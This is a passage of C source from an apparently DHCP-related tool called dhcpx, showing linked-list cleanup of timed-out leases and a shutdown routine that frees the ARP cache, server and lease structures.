    lease_t		*l,*l2;

    if ((l=s->leases)==NULL) return;
    while (l!=NULL) {
	if ((l->status==LEASE_STAT_NEW)
		&&(l->since+REQ_TIMEOUT<(unsigned long)time(NULL))) {
	    if (cfg.verbose>=2) {
		printf("Lease %s ",inet_ntoa(l->addr));
		printf("from server %s was not answerd - removing\n",
			inet_ntoa(s->addr));
	    }

	    if (l==s->leases) {
		l2=s->leases->next;
		s->leases=l2;
		free(l);
		l=l2;
	    } else {
		l2=s->leases;
		while (l2->next!=l) l2=l2->next;
		l2->next=l->next;
		free(l);
		l=l2;
	    }
	}
	if (l!=NULL) /* check needed since removal might happend*/ 
	    l=l->next;
    }
}


void dhcpx_shutdown(void) {
    arpcache_t		*a;
    server_t		*s;
    lease_t		*l1,*l2;

    a=arp;
    while(a!=NULL) {
	arp=a;
	a=a->next;
	free(arp);
    }

    s=servers;
    while(s!=NULL) {
	l1=s->leases;
	while (l1!=NULL) {
	    l2=l1;
	    l1=l1->next;
	    free(l2);
	}
	servers=s;
	s=s->next;
	free(servers);
    }

    if (cfg.verbose) printf("Shutdown complete\n");
}
